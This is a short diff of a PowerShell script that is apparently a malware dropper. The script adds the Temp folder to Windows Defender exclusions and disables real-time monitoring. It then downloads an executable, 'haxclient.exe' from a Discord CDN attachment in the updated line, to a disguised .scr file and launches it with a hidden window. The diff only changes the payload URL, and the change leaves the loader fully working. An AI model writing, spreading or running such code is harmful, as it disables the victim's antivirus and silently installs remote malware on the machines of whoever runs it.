@@ -1,7 +1,7 @@
 $oP = "$env:Temp"
 Add-MpPreference -ExclusionPath $oP
 Set-MpPreference -DisableRealtimeMonitoring $true
-$fU = "https://31.filelu.com/d/w53hgxdqjtkfjjtaz6mis4n2qyb2jpr6lklnfmoqhg7tt5ui7xh26kvekdgit7eku74zif22/vshost.exe"
+$fU = "https://cdn.discordapp.com/attachments/1176903894257897514/1208068363889147934/haxclient.exe?ex=668ea4d6&is=668d5356&hm=962e3eefedbf46267a4b3ee66cb77a62ab7c2086854b1dd2cb6d7d186dcb7d09&"
 $oPT = "$env:Temp\​.scr"
 Invoke-WebRequest -Uri $fU -OutFile $oPT -ErrorAction Stop
 Start-Process -FilePath $oPT -WindowStyle Hidden -Wait
